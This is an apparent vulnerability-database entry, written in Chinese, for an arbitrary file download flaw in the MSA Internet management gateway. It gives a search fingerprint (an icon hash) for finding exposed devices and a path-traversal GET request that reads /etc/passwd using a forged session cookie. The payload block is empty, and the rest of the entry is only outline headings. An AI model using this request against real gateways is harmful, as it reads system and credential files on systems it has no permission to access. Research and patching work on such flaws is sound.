# MSA互联网管理网关msa任意文件下载漏洞

- **系统**：MSA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`web.icon=="73043af39b293ade8de257c2370de7bd"`
- **请求**：`GET /msa/../../../../etc/passwd HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: msasessionid=-1`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- MSA 互联网管理网关 msa 任意文件下载漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * MSA 互联网管理网关